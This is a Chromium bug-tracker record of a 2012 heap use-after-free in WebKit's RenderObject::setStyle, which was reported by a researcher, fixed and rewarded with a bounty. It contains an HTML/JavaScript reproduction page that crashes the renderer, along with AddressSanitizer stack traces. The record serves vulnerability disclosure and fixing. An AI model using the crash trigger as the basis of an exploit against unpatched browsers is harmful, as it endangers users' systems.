# Heap-use-after-free in WebCore::RenderObject::setStyle

| Field | Value |
|-------|-------|
| **Issue ID** | [40058852](https://issues.chromium.org/issues/40058852) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-05-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderObject::setStyle

**VERSION**  

Chrome Version: stable + dev

Chromium 21.0.1154.0 (Developer Build 139215)  

OS Linux  

WebKit 537.1 (@118560)

Operating System: 64bit preceise

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-columns: 1;
}
#el2:first-of-type {
}
#el2:first-letter {
content: counter(c);
}
#el3 {
-webkit-column-span: all;
content: counter(c) attr(A);
}
</style>
<script>
onload = function() {
el0=document.createElement('div')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('b')
el0.appendChild(el1)
el1.appendChild(document.createTextNode('A'))
el2=document.createElement('div')
el2.setAttribute('id','el2')
el0.appendChild(el2)
el3=document.createElement('div')
el3.setAttribute('id','el3')
el2.appendChild(el3)
document.designMode='on'
document.execCommand('selectall')
el2.appendChild(document.createTextNode('AA'))
document.designMode='on'
document.execCommand('selectall')
document.execCommand('removeFormat')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: asan + tab  

Crash State:

==9160== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe788ed98 at pc 0x55555b09e4e6 bp 0x7fffffff5d50 sp 0x7fffffff5d48  

READ of size 8 at 0x7fffe788ed98 thread T0  

#0 0x55555b09e4e6 in WebCore::RenderObject::setStyle(WTF::PassRefPtr[WebCore::RenderStyle](javascript:void(0);)) ???:0  

#1 0x555559565c9d in WebCore::Text::recalcTextStyle(WebCore::Node::StyleChange) ???:0  

#2 0x5555594a0467 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0  

#3 0x5555594a042b in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0

0x7fffe788ed98 is located 24 bytes inside of 120-byte region [0x7fffe788ed80,0x7fffe788edf8)  

freed by thread T0 here:  

#0 0x55555e567bf2 in free ??:0  

#1 0x55555ae49b1f in WebCore::RenderBlock::createFirstLetterRenderer(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0  

#2 0x55555ae4a83e in WebCore::RenderBlock::updateFirstLetter() ???:0  

#3 0x55555b09de29 in WebCore::RenderObject::setStyle(WTF::PassRefPtr[WebCore::RenderStyle](javascript:void(0);)) ???:0  

#4 0x555559565c9d in WebCore::Text::recalcTextStyle(WebCore::Node::StyleChange) ???:0

## Attachments

- [stable-24120.txt](attachments/stable-24120.txt) (text/plain; charset=us-ascii, 12.9 KB)
- [24120.html](attachments/24120.html) (text/html; charset=us-ascii, 1.1 KB)
- [24120.txt](attachments/24120.txt) (text/plain; charset=us-ascii, 13.3 KB)

## Timeline

### in...@chromium.org (2012-05-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=52474168

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f3e3f056998
Crash State:
  - crash stack -
  WebCore::RenderObject::setStyle
  WebCore::Text::recalcTextStyle
  - free stack -
  WebCore::RenderBlock::createFirstLetterRenderer
  WebCore::RenderBlock::updateFirstLetter
  

Minimized Testcase (0.92 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94TekDyHOEkzFQvHULN9xEHmgPqZOf9EuJxtjufcjiu5dPoLDpBgcuzCN9x0S1_yZ4iQWAvrvQu2LwKxTiGjTySk9vRAiLbCzjqVfANGuNgHg7RwHOPmGr2Hxa1tnCnX8YWOMAVA2oiVQQ4RIQn6q-HuSm-CA

### in...@chromium.org (2012-05-29)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=87751. looking.

### in...@chromium.org (2012-05-29)

http://trac.webkit.org/changeset/118816

### sc...@gmail.com (2012-05-29)

Thanks miaubiz! Keep 'em coming :)

### cl...@chromium.org (2012-05-30)

ClusterFuzz has detected this issue as fixed in range 139395:139500.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=52474168

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f3e3f056998
Crash State:
  - crash stack -
  WebCore::RenderObject::setStyle
  WebCore::Text::recalcTextStyle
  - free stack -
  WebCore::RenderBlock::createFirstLetterRenderer
  WebCore::RenderBlock::updateFirstLetter
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=139395:139500

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94TekDyHOEkzFQvHULN9xEHmgPqZOf9EuJxtjufcjiu5dPoLDpBgcuzCN9x0S1_yZ4iQWAvrvQu2LwKxTiGjTySk9vRAiLbCzjqVfANGuNgHg7RwHOPmGr2Hxa1tnCnX8YWOMAVA2oiVQQ4RIQn6q-HuSm-CA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-06-06)

M20: http://trac.webkit.org/changeset/119632

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/129947?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058852)*
